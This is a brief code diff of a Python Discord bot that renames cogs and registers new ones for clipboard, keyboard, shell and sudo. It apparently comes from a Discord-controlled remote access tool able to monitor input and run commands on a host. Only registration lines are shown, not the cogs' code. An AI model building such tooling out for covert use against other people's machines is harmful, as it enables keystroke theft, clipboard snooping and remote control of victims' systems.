@@ -23,8 +23,10 @@ class MyBot(commands.Bot):
     async def setup_hook(self):
         # self is the bot here
         print(f"Logged in as: {self.user}")
-        await self.add_cog(clipboard_monitor(bot))
-        await self.add_cog(SudoCog(bot))
+        await self.add_cog(clipboard_cog(bot))
+        await self.add_cog(keyboard_cog(bot))
+        await self.add_cog(shell_cog(bot))
+        await self.add_cog(sudo_cog(bot))
 
 bot = MyBot(command_prefix=["!","! "], intents=intents, help_command=None)
 
@@ -385,7 +387,7 @@ if isWindows == False:
 
     # root functions
 
-    class SudoCog(commands.Cog):
+    class sudo_cog(commands.Cog):
         def __init__(self, bot):
             self.bot = bot
 
